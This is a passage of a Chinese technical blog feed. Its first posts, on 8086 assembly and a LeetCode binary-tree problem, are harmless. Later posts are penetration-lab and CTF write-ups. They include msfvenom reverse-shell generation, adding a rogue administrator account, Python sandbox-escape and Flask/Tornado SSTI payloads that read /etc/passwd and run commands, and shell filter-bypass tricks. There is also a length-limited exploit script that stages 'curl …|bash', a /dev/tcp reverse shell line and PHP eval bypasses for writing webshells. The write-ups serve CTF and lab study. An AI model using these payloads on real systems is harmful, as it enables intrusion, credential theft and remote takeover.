        <content type="html"><![CDATA[<h2 id="从汇编程序开始"><a href="#从汇编程序开始" class="headerlink" title="从汇编程序开始"></a>从汇编程序开始</h2><pre><code class="x86asm">assume cs:codesgcodesg segment    mov ax,0123H    mov bx,0456H    add ax,bx    add ax,ax    mov ax,4c00H    int 21Hcodesg endsend</code></pre><p>伪指令</p><pre><code>段名 segment段名 ends</code></pre><p><code>end</code> 和 <code>ends</code> 不一样， end标记整个程序的结束<br><code>assume</code> 将有特定用途的段和相关的段寄存器关联起来</p><p>程序返回</p><pre><code>    mov ax,4c00H    int 21H</code></pre><p>编写代码，使用 MASM.exe 编译，然后使用 LINK.exe 进行链接</p><p><img src="/posts/2e9d33db/1583847029418.png" alt></p><p><img src="/posts/2e9d33db/1583847034341.png" alt></p><p>运行当然是没有结果的，我们需要使用 <code>debug</code> 调试</p><h2 id="可执行文件的加载过程"><a href="#可执行文件的加载过程" class="headerlink" title="可执行文件的加载过程"></a>可执行文件的加载过程</h2><p>程序加载的时候，找到一个段地址 <code>SA:0000</code>,程序从 <code>SA+10H:0000</code> 处开始运行，<code>SA</code> 存放在 ds寄存器中</p><p>刚加载进内存中时，</p><p><img src="/posts/2e9d33db/1583847094408.png" alt></p><p>此时看到 ds 寄存器的内容为 <code>075AH</code> ,所以程序的物理地址就是 ds+10h ,正好符合<br>在int21 时需要使用 p命令执行</p><p><img src="/posts/2e9d33db/1583847103427.png" alt></p><h2 id="实验3-编译链接跟踪"><a href="#实验3-编译链接跟踪" class="headerlink" title="实验3 编译链接跟踪"></a>实验3 编译链接跟踪</h2><pre><code class="x86asm">assume cs:codesgcodesg segment    mov ax,2000H  ; AX=2000H    mov ss,ax     ; SS=2000H    mov sp,0      ; SP=0    add sp,10     ; SP=10    pop ax        ; SP=000CH, AX=076AH    pop bx        ; SP=000EH, BX=7206H    push ax       ; SP=000CH    push bx       ; SP=000AH     pop ax        ; AX=7c06H    pop bx        ; BX=076AH    mov ax,4c00H    int 21Hcodesg endsend</code></pre><p>PSP 的头两个字节是CD20,用debug加载，查看PSP的内容</p><p><img src="/posts/2e9d33db/1583847116112.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一道leetcode-二叉树的直径</title>
      <link href="/posts/c2fa82b5/"/>
      <url>/posts/c2fa82b5/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一棵二叉树，你需要计算它的直径长度。一棵二叉树的直径长度是任意两个结点路径长度中的最大值。这条路径可能穿过根结点。</p><p>示例 :<br>给定二叉树</p><pre><code>      1     / \    2   3   / \       4   5    </code></pre><p>返回 3, 它的长度是路径 [4,2,1,3] 或者 [5,2,1,3]。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>找到左子树的节点个数，右子树的节点个数，剩下的就好做了</p><p>我写了的lj代码</p><pre><code class="java">package March;/** * @description: 二叉树的直径 * @author: Pxy * @create: 2020-03-10 20:02 **//** * [4,-7,-3,null,null,-9,-3,9,-7,-4,null,6,null,-6,-6,null,null,0,6,5,null,9,null,null,-1,-4,null,null,null,-2] * 上面这个结果过不了 */public class diameterOfBinaryTree {    class TreeNode{        int val;        TreeNode left;        TreeNode right;        TreeNode(int x){            val = x;}    }    public int diameterOfBinaryTree(TreeNode root) {        if (root == null) {            return 0;        }        if (root.right == null) {            return helper(root.left);        } else if (root.left == null) {            return helper(root.right);        } else {            int leftLength = helper(root.left);            int rightLength = helper(root.right);            return leftLength + rightLength;        }    }    public static int helper(TreeNode root) {        if (root != null) {            return Math.max(helper(root.left), helper(root.right)) + 1;        } else {            return 0;        }    }}</code></pre><p>但是leetcode提交的时候给了一个奇葩的测试样例</p><pre><code>[4,-7,-3,null,null,-9,-3,9,-7,-4,null,6,null,-6,-6,null,null,0,6,5,null,9,null,null,-1,-4,null,null,null,-2]</code></pre><p>这。。</p><p><img src="/posts/c2fa82b5/1583846422840.png" alt></p><p>算了我暂时也看不出哪里有问题</p><h2 id="官方"><a href="#官方" class="headerlink" title="官方"></a>官方</h2><pre><code class="java">class Solution {    int ans;    public int diameterOfBinaryTree(TreeNode root) {        ans = 1;        depth(root);        return ans - 1;    }    public int depth(TreeNode node) {        if (node == null) return 0; // 访问到空节点了，返回0        int L = depth(node.left); // 左儿子为根的子树的深度        int R = depth(node.right); // 右儿子为根的子树的深度        ans = Math.max(ans, L+R+1); // 计算d_node即L+R+1 并更新ans        return Math.max(L, R) + 1; // 返回该节点为根的子树的深度    }}</code></pre><p>思路也是比较简单的，不过这个用法很神奇，<code>depth</code> 函数有返回值，这个返回值只在递归的时候用到</p><p>java写OJ的时候如果要用全局变量，只需要在外面写一个就行了。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://leetcode-cn.com/problems/diameter-of-binary-tree/solution/liang-chong-si-lu-shi-yong-quan-ju-bian-liang-yu-b/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/diameter-of-binary-tree/solution/liang-chong-si-lu-shi-yong-quan-ju-bian-liang-yu-b/</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞挖掘实验</title>
      <link href="/posts/12fff649/"/>
      <url>/posts/12fff649/</url>
      
        <content type="html"><![CDATA[<p>实验拓扑如下</p><p><img src="/posts/12fff649/1583830717716.png" alt></p><p><img src="/posts/12fff649/1583830733667.png" alt></p><h2 id="任务一-寻找漏洞主机"><a href="#任务一-寻找漏洞主机" class="headerlink" title="任务一 寻找漏洞主机"></a>任务一 寻找漏洞主机</h2><p>扫描存活主机(虽然知道了但还是扫一下)</p><p>注意本机ip是192.168.1.2</p><p><img src="/posts/12fff649/1583830890209.png" alt></p><p>-F 选项快速扫描一下其他主机</p><p><img src="/posts/12fff649/1583830929741.png" alt></p><p><img src="/posts/12fff649/1583830945755.png" alt></p><p>既然是ftp，那么就锁定192.168.1.3</p><p>提示了搜索vsftpd (靶机上搜索太慢了，我在自己机器上搜索的)</p><p><img src="/posts/12fff649/1583831162349.png" alt></p><p>然后使用这个exploit去打就行了</p><p><img src="/posts/12fff649/1583831194224.png" alt></p><p>可以看到进去就是root权限hhhh</p><p>然后还要搜索 1.key 这个文件</p><pre><code>find  / -name 1.key</code></pre><p><img src="/posts/12fff649/1583831225885.png" alt></p><p>读一下就好了</p><h2 id="任务二-使用nikto、crunch和burpsuite进行网站渗透和控制"><a href="#任务二-使用nikto、crunch和burpsuite进行网站渗透和控制" class="headerlink" title="任务二 使用nikto、crunch和burpsuite进行网站渗透和控制"></a>任务二 使用nikto、crunch和burpsuite进行网站渗透和控制</h2><p>此时的目标转向了 192.168.1.4 (192.168.1.3都拿到root了)</p><p>打开网站是 Cms made Simple 简称cms cms</p><p><img src="/posts/12fff649/1583831499729.png" alt></p><p>后台地址 <code>/admin/login.php</code></p><p>先设置一个代理</p><p><img src="/posts/12fff649/1583832214527.png" alt></p><p>然后抓个包</p><p><img src="/posts/12fff649/1583832242295.png" alt></p><p>由于密码是 <code>admin</code> 加上三位数字，如果想用 crunch 生成也行，直接用burp也行</p><p>爆破成功</p><p><img src="/posts/12fff649/1583832729565.png" alt></p><p>进入到网站后台</p><p><img src="/posts/12fff649/1583832774511.png" alt></p><h2 id="任务三-获取webshell权限并拿到目标及开放的远程桌面端口号"><a href="#任务三-获取webshell权限并拿到目标及开放的远程桌面端口号" class="headerlink" title="任务三 获取webshell权限并拿到目标及开放的远程桌面端口号"></a>任务三 获取webshell权限并拿到目标及开放的远程桌面端口号</h2><p>漏洞点在这</p><p><img src="/posts/12fff649/1583833127686.png" alt></p><p>Run一下</p><p><img src="/posts/12fff649/1583833240668.png" alt></p><p>好那我们这里为了避免网页卡顿。用msf生成一个shell.php</p><pre><code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.2 lport=4444 -f raw -o shell.txt</code></pre><p>然后复制到框框里运行一下</p><p>同时msf进行监听</p><p><img src="/posts/12fff649/1583833748737.png" alt></p><p>成功弹到shell。之后再使用msf生成shell.exe</p><pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.2 lport=4444 -f exe -o shell.exe</code></pre><p>上传，重新弹一个shell</p><p><img src="/posts/12fff649/1583833790609.png" alt></p><p>ok这时候就能获得真正的meterpreter了</p><p>查看一下监听端口</p><p><img src="/posts/12fff649/1583833821793.png" alt></p><p>随便猜一个吧2333</p><h2 id="任务四-向目标主机添加用户并控制"><a href="#任务四-向目标主机添加用户并控制" class="headerlink" title="任务四 向目标主机添加用户并控制"></a>任务四 向目标主机添加用户并控制</h2><p>这个步骤和上一个实验比较相似，就不用细说了</p><pre><code>net user hacker Beijing123 /addnet localgroup administrators hacker /add</code></pre><p>远程登陆之后，给文件添加一个用户即可</p><p>最后</p><p><img src="/posts/12fff649/1583833940934.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>企业环境渗透2</title>
      <link href="/posts/c08799e1/"/>
      <url>/posts/c08799e1/</url>
      
        <content type="html"><![CDATA[<h2 id="任务一-weblogic反序列化"><a href="#任务一-weblogic反序列化" class="headerlink" title="任务一 weblogic反序列化"></a>任务一 weblogic反序列化</h2><p>weblogic介绍</p><p>浏览器访问192.168.2.10:7001 然后就404</p><p><img src="/posts/c08799e1/1583826737126.png" alt></p><p>使用工具包中的webloigc利用工具</p><p><img src="/posts/c08799e1/1583826784567.png" alt></p><p>看到flag了是不是，然后执行 <code>cat /home/flag</code> 是吧233333</p><p>其实，这个flag不过就是个目录。。</p><p><img src="/posts/c08799e1/1583826861077.png" alt></p><p>得到flag</p><p><img src="/posts/c08799e1/1583826902355.png" alt="1583826902355"></p><h2 id="任务二-Wrodpress-任意文件读取"><a href="#任务二-Wrodpress-任意文件读取" class="headerlink" title="任务二 Wrodpress 任意文件读取"></a>任务二 Wrodpress 任意文件读取</h2><p>wpscan常规扫描一下</p><p><img src="/posts/c08799e1/1583826949884.png" alt></p><p>存在一个任意文件读取漏洞(不能复制粘贴好难受)</p><p><img src="/posts/c08799e1/1583826994083.png" alt></p><h2 id="任务三-Wordpress命令执行"><a href="#任务三-Wordpress命令执行" class="headerlink" title="任务三 Wordpress命令执行"></a>任务三 Wordpress命令执行</h2><h2 id="任务四-改进漏洞利用脚本获得命令执行权限"><a href="#任务四-改进漏洞利用脚本获得命令执行权限" class="headerlink" title="任务四 改进漏洞利用脚本获得命令执行权限"></a>任务四 改进漏洞利用脚本获得命令执行权限</h2>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python沙盒逃逸</title>
      <link href="/posts/ed9dc04e/"/>
      <url>/posts/ed9dc04e/</url>
      
        <content type="html"><![CDATA[<h2 id="python2"><a href="#python2" class="headerlink" title="python2"></a>python2</h2><p>两个重要的类，一般都会用到</p><pre><code class="python">In [44]: object.__subclasses__()[59]Out[44]: warnings.catch_warningsIn [45]: object.__subclasses__()[40]Out[45]: file</code></pre><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><pre><code class="python">().__class__.__bases__[0].__subclasses__()[40](&#39;filename&#39;).readlines()().__class__.__mro__[1].__subclasses__()[40](&#39;filename&#39;).readlines()</code></pre><p>如图</p><p><img src="/posts/ed9dc04e/1582442823657.png" alt></p><pre><code class="python">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].getlines(&#39;/etc/passwd&#39;)</code></pre><p><img src="/posts/ed9dc04e/1582444265686.png" alt></p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><pre><code class="python">().__class__.__base__.__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;]</code></pre><p><img src="/posts/ed9dc04e/1582443624642.png" alt></p><pre><code class="python">().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&#39;func_global&#39;+&#39;s&#39;)[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;popen&#39;](&#39;l&#39;+&#39;s&#39;).read()#也可以写成().__class__.__bases__[.__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__[&#39;os&#39;].popen(&#39;ls&#39;).read()# 等价于object.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;id&#39;).read()</code></pre><p><img src="/posts/ed9dc04e/1582446827696.png" alt></p><p>可以使用 <code>__getattribute__</code> 获得属性， <code>__dict__</code></p><p>寻找可以利用的模块</p><pre><code class="python">search = &#39;os&#39;   #也可以是其他你想利用的模块num = -1for i in ().__class__.__bases__[0].__subclasses__():    num += 1    try:        keys = i.__init__.__globals__.keys()        if search in keys:            print(i, num)    except:        pass &#39;&#39;&#39;(&lt;class &#39;site._Printer&#39;&gt;, 71)(&lt;class &#39;site.Quitter&#39;&gt;, 76)(&lt;class &#39;socket._socketobject&#39;&gt;, 124)...&#39;&#39;&#39;</code></pre><p>比如</p><p><img src="/posts/ed9dc04e/1582443247342.png" alt></p><p>来自其他师傅的</p><pre><code class="python">object.__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)object.__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)object.__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()object.__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;id&#39;).read()</code></pre><h2 id="py2和3通吃"><a href="#py2和3通吃" class="headerlink" title="py2和3通吃"></a>py2和3通吃</h2><pre><code class="python">search = &#39;__builtins__&#39;   #也可以是其他你想利用的模块num = -1for i in ().__class__.__bases__[0].__subclasses__():    num += 1    try:        keys = i.__init__.__globals__.keys()        if search in keys:            print(i, num)    except:        pass </code></pre><p>python2 举例</p><pre><code class="python">().__class__.__bases__[0].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</code></pre><p><img src="/posts/ed9dc04e/1582446435900.png" alt></p><p>python3</p><pre><code class="python">().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</code></pre><p><img src="/posts/ed9dc04e/1582443435704.png" alt></p><h2 id="python3-读文件"><a href="#python3-读文件" class="headerlink" title="python3 读文件"></a>python3 读文件</h2><pre><code class="python">In [64]: &quot;&quot;.__class__.__bases__[0].__subclasses__()[127]Out[64]: os._wrap_close&quot;&quot;.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__[&#39;popen&#39;](&#39;cat /etc/&#39;+&#39;passwd&#39;).read()</code></pre><p>i春秋比赛的一道题的payload</p><pre><code class="python">{{"".__class__.__bases__[0].__subclasses__()[127].__init__.__globals__['po'+'pen']('cat this_is_the_fl'+'ag.txt').read()}}# waf 拦截了 popen 和 flag</code></pre><h2 id="flask-SSTI"><a href="#flask-SSTI" class="headerlink" title="flask SSTI"></a>flask SSTI</h2><p>常用的</p><pre><code class="python">{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}</code></pre><h3 id="request对象"><a href="#request对象" class="headerlink" title="request对象"></a>request对象</h3><p> 这个对象指的是当前请求对象，<code>request.environ</code>对象是一个与服务器环境相关的对象字典。值得一提的是，可以通过访问<code>request.args.get</code> <code>request.cookies</code> <code>request.headers</code>等访问我们的请求参数，这主要是用来绕过过滤。（比如不让输入某关键字，我们就可以通过cookies传入，然后从request.cookies获取即可）</p><h3 id="config对象"><a href="#config对象" class="headerlink" title="config对象"></a>config对象</h3><p> config对象是当前配置对象，是一个类字典的对象，可以用<code>config.items()</code>来访问。而且它还有一些独特1的方法，<code>from_envvar</code>, <code>from_object</code>, <code>from_pyfile</code> 。<code>from_pyfile</code>可以读取指定python文件编译并加载进来。</p><h2 id="tornado-SSTI"><a href="#tornado-SSTI" class="headerlink" title="tornado SSTI"></a>tornado SSTI</h2><p>护网杯2018的一道题</p><p><img src="/posts/ed9dc04e/1582507995702.png" alt></p><p>然后我们通过 <code>{{handler.settings}}</code>来获得 cookie_secret</p><p><img src="/posts/ed9dc04e/1582508041772.png" alt></p><p>最后得到 flag</p><pre><code>http://efc64735-8171-468a-b0eb-98510cefe54d.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=5af68d1f8101c8a5cea67790540f1a1e</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行绕过技巧</title>
      <link href="/posts/58281de6/"/>
      <url>/posts/58281de6/</url>
      
        <content type="html"><![CDATA[<h2 id="tar命令绕过"><a href="#tar命令绕过" class="headerlink" title="tar命令绕过"></a>tar命令绕过</h2><p>最近也是才知道的姿势，很多CTF题目并没有过滤tar命令，可以直接打包然后下载，GXYCTF的一道题就可以这样非预期</p><pre><code>?ip=1;tar$IFS$9-cvf$IFS$9index$IFS$9.</code></pre><p><img src="/posts/58281de6/1582542493140.png" alt></p><h2 id="Windows命令执行"><a href="#Windows命令执行" class="headerlink" title="Windows命令执行"></a>Windows命令执行</h2><pre><code class="php">&lt;?php$a = &quot;../ %1a whoami&quot;;$command = &#39;dir &#39;.urldecode($a);$escaped_command = escapeshellcmd($command);var_dump($escaped_command);file_put_contents(&#39;out.bat&#39;,$escaped_command);system(&#39;out.bat&#39;);?&gt;</code></pre><img src="/posts/58281de6/2020/PersonNote/CTF笔记/命令执行绕过技巧/1581933022683.png" style="zoom:50%;"><h2 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h2><pre><code>|||&amp;&amp;;</code></pre><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><pre><code>~ ᐅ cat&lt;&gt;flag     flag{fffffffffff}~ ᐅ cat&lt;flag flag{fffffffffff}</code></pre><p><code>${IFS}</code> </p><p>这算是Linux中的一个变量</p><blockquote><p>Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符（internal field separator）。IFS环境变量定义了bash shell用户字段分隔符的一系列字符。默认情况下，bash shell会将下面的字符当做字段分隔符：空格、制表符、换行符。</p></blockquote><pre><code>~ ᐅ echo ${IFS} &gt; aa.txt~ ᐅ xxd aa.txt 00000000: 2009 0a00 0a                              ....//用python读取一下&gt;&gt;&gt; f = open(&quot;aa.txt&quot;)&gt;&gt;&gt; f.readlines()[&#39; \t\n&#39;, &#39;\x00\n&#39;]</code></pre><p>使用 <code>${IFS}</code> 绕过(但是我没有实验成功)  ==只适用于Ubuntu==</p><pre><code class="bash">ubuntu@VM-207-93-ubuntu:~$ cat flagnice dayubuntu@VM-207-93-ubuntu:~$ cat${IFS}flagnice dayubuntu@VM-207-93-ubuntu:~$ cat${IFS}$9flagnice dayubuntu@VM-207-93-ubuntu:~$ cat$IFS$9flagnice day</code></pre><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><p>有些时候会设置一些关键字过滤(比如设置flag)</p><h3 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h3><pre><code>~ ᐅ a=c;b=at;c=flag;$a$b $cflag{fffffffffff}</code></pre><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><pre><code>~ ᐅ echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bashflag{fffffffffff}</code></pre><h3 id="单引号双引号"><a href="#单引号双引号" class="headerlink" title="单引号双引号"></a>单引号双引号</h3><pre><code class="bash">~ ᐅ c&quot;&quot;at flagflag{fffffffffff}~ ᐅ c&quot;&quot;at fl&quot;&quot;agflag{fffffffffff}~ ᐅ c&quot;&quot;at fl&#39;&#39;agflag{fffffffffff}</code></pre><h3 id="反斜线"><a href="#反斜线" class="headerlink" title="反斜线"></a>反斜线</h3><pre><code>~ ᐅ c\at fl\agflag{fffffffffff}</code></pre><h2 id="绕过长度的限制"><a href="#绕过长度的限制" class="headerlink" title="绕过长度的限制"></a>绕过长度的限制</h2><p>原题</p><pre><code class="php">&lt;?php    $sandbox = &#39;/www/sandbox/&#39; . md5(&quot;orange&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);    @mkdir($sandbox);    @chdir($sandbox);    if (isset($_GET[&#39;cmd&#39;]) &amp;&amp; strlen($_GET[&#39;cmd&#39;]) &lt;= 5) {        @exec($_GET[&#39;cmd&#39;]);    } else if (isset($_GET[&#39;reset&#39;])) {        @exec(&#39;/bin/rm -rf &#39; . $sandbox);    }    highlight_file(__FILE__);</code></pre><p>Linux 可以通过 <code>\</code> 换行</p><p><code>sh filename</code> 可以执行一个shell脚本，如果有报错的话会自动跳过</p><p><code>&gt;</code> 会覆盖原有的内容</p><p><code>&gt;&gt;</code> 是追加内容</p><p>思路就是通过构造一个文件然后往里面写入类似<code>curl 192.168.1.104|bash</code> 之类的语句然后执行，其实还可以利用其他python 以及PHP环境去执行代码，访问 <code>192.168.1.104/index.php</code>里面的内容<code>bash -i &gt;&amp; /dev/tcp/192.168.1.104/12345 0&gt;&amp;1</code>从而达到反弹webshell的目的</p><p>php执行生成的_的内容序列并非和我们在linux命令行一样，查资料 ls 排序和应该和环境变量<code>LC_COLLATE</code>有关！而php应该是c<br><a href="https://www.zhihu.com/question/273928679" target="_blank" rel="noopener">https://www.zhihu.com/question/273928679</a></p><p><img src="/posts/58281de6/1582539212357.png" alt></p><p>最后的exp</p><pre><code class="python">import requestsfrom time import sleepfrom urllib import quotepayload = [    # generate `ls -t&gt;g` file    &#39;&gt;ls\\&#39;,     &#39;ls&gt;_&#39;,     &#39;&gt;\ \\&#39;,     &#39;&gt;-t\\&#39;,     &#39;&gt;\&gt;g&#39;,     &#39;ls&gt;&gt;_&#39;,     # generate `curl orange.tw.tw|python`    # generate `curl 10.188.2.20|bash`     &#39;&gt;sh\ &#39;,     &#39;&gt;ba\\&#39;,     &#39;&gt;\|\\&#39;,    &#39;&gt;20\\&#39;,    &#39;&gt;2.\\&#39;,     &#39;&gt;8.\\&#39;,    &#39;&gt;18\\&#39;,     &#39;&gt;0.\\&#39;,     &#39;&gt;1\\&#39;,     &#39;&gt;\ \\&#39;,     &#39;&gt;rl\\&#39;,     &#39;&gt;cu\\&#39;,     # exec    &#39;sh _&#39;,     &#39;sh g&#39;, ]r = requests.get(&#39;http://10.188.2.20:22460/?reset=1&#39;)for i in payload:    assert len(i) &lt;= 5     r = requests.get(&#39;http://10.188.2.20:22460/?cmd=&#39; + quote(i) )    print i    sleep(0.2)</code></pre><p><a href="https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge" target="_blank" rel="noopener">Dockerfile</a></p><h2 id="绕过长度为4的限制"><a href="#绕过长度为4的限制" class="headerlink" title="绕过长度为4的限制"></a>绕过长度为4的限制</h2><p>。。太狠了</p><h2 id="绕过长度限制写shell"><a href="#绕过长度限制写shell" class="headerlink" title="绕过长度限制写shell"></a>绕过长度限制写shell</h2><p><img src="/posts/58281de6/1582540869115.png" alt></p><h2 id="参数注入"><a href="#参数注入" class="headerlink" title="参数注入"></a>参数注入</h2><p>gitlist远程命令执行漏洞</p><pre><code class="php">&lt;?phppublic function searchTree($query, $branch){    if (empty($query)) {        return null;    }    $query = escapeshellarg($query);    try {        $results = $this-&gt;getClient()-&gt;run($this, &quot;grep -i --line-number {$query} $branch&quot;);    } catch (\RuntimeException $e) {        return false;    }</code></pre><p>复现：</p><p>这里的问题出在单引号并不能使得包裹的内容成为一个非选项</p><p><img src="/posts/58281de6/dd89dc70-2446-48e1-a728-5693d1fa868a.bbb0aaacef7d.png" alt></p><p>创建一个 <code>--name</code> 文件，但是无法直接用 cat进行读取，因为会被认为是一个选项，即使是用单引号包裹也不行</p><p>比如这个命令就不会执行，因为单引号包裹的内容放在 <code>-e</code> 选项的值中</p><pre><code>git grep -i --line-number -e &#39;--open-files-in-pager=id;&#39; master</code></pre><p><img src="/posts/58281de6/1582541083787.png" alt></p><p>必须是 <code>cat -- --name</code>, 从这个例子也能看出，单引号并不是区分一个字符串是“参数值”或“选项”的标准。</p><p>修复：</p><pre><code class="php">&lt;?phppublic function searchTree($query, $branch){    if (empty($query)) {        return null;    }    $query = preg_replace(&#39;/(--?[A-Za-z0-9\-]+)/&#39;, &#39;&#39;, $query);    $query = escapeshellarg($query);    try {        $results = $this-&gt;getClient()-&gt;run($this, &quot;grep -i --line-number -- {$query} $branch&quot;); //强制加入 -- 使得后面的成为参数的值    } catch (\RuntimeException $e) {        return false;    }</code></pre><p>python中存在的漏洞点</p><pre><code class="python">import subprocessquery = &#39;id&#39;r = subprocess.run([&#39;git&#39;, &#39;grep&#39;, &#39;-i&#39;, &#39;--line-number&#39;, query, &#39;master&#39;], cwd=&#39;/tmp/vulhub&#39;)</code></pre><p><img src="/posts/58281de6/8296bbd4-40cd-481e-9147-6f11e80967d8.6b4cdb17a1b8.png" alt></p><h2 id="eval长度限制绕过-amp-amp-PHP5-6新特性"><a href="#eval长度限制绕过-amp-amp-PHP5-6新特性" class="headerlink" title="eval长度限制绕过 &amp;&amp; PHP5.6新特性"></a>eval长度限制绕过 &amp;&amp; PHP5.6新特性</h2><pre><code class="php">&lt;?php$param = $_REQUEST[&#39;param&#39;];if(strlen($param)&lt;17 &amp;&amp; stripos($param,&#39;eval&#39;) === false &amp;&amp; stripos($param,&#39;assert&#39;) === false) {  eval($param);}?&gt;</code></pre><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><pre><code>param=`$_GET[1]`;&amp;1=bash</code></pre><p>或者</p><pre><code>param=exec($_GET[1]);</code></pre><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>有的同学提到了远程文件，但正常文件包含<code>include $_GET[1];</code>，这个刚好17个字符，超了一位。</p><p>不过，其实<code>include$_GET[1];</code>也是可以运行的，中间的空格可以不要。</p><p>这也是一个思路，但限制就是需要开启远程文件包含，但这个选项默认是关闭的。</p><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><pre><code>param=$_GET[a](N,a,8);&amp;a=file_put_contents</code></pre><p>file_put_contents的第一个参数是文件名，我传入N。PHP会认为N是一个常量，但我之前并没有定义这个常量，于是PHP就会把它转换成字符串’N’；第二个参数是要写入的数据，a也被转换成字符串’a’；第三个参数是flag，当flag=8的时候内容会追加在文件末尾，而不是覆盖。</p><p>除了<code>file_put_contents</code>，<code>error_log</code>函数效果也类似。</p><p>但是file_put_contents第二个参数如果是符号，就会导致PHP出错，比如<code>param=$_GET[a](N,&lt;,8);&amp;a=file_put_contents</code>。但如果要写webshell的话，“&lt;”等符号又是必不可少的。</p><p>写shell的方法</p><pre><code># 每次写入一个字符：PD9waHAgZXZhbCgkX1BPU1RbOV0pOw# 最后包含param=include$_GET[0];&amp;0=php://filter/read=convert.base64-decode/resource=N</code></pre><h4 id="本地日志包含"><a href="#本地日志包含" class="headerlink" title="本地日志包含"></a>本地日志包含</h4><pre><code>param=include$_GET[a];&amp;a=/home/u244201241/.logs/php_error.log</code></pre><h3 id="标准答案，利用变长参数执行"><a href="#标准答案，利用变长参数执行" class="headerlink" title="标准答案，利用变长参数执行"></a>标准答案，利用变长参数执行</h3><pre><code>POST /test.php?1[]=test&amp;1[]=var_dump($_SERVER);&amp;2=assert HTTP/1.1Host: localhost:8081Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 22param=usort(...$_GET);</code></pre><p><img src="/posts/58281de6/1582707944277.png" alt></p><p><a href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html" target="_blank" rel="noopener">参考</a></p><p>一个坑</p><p>想请教下，为什么用标准答案的方法时，get参数必须用数字才能正常执行，换成比如？a[]=test&amp;a[]=phpinfo();&amp;b=assert时就会失败，不知可否解答下</p><p>只有数字索引数组才能作为变长参数数组。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-lab记录</title>
      <link href="/posts/70df97a2/"/>
      <url>/posts/70df97a2/</url>
      
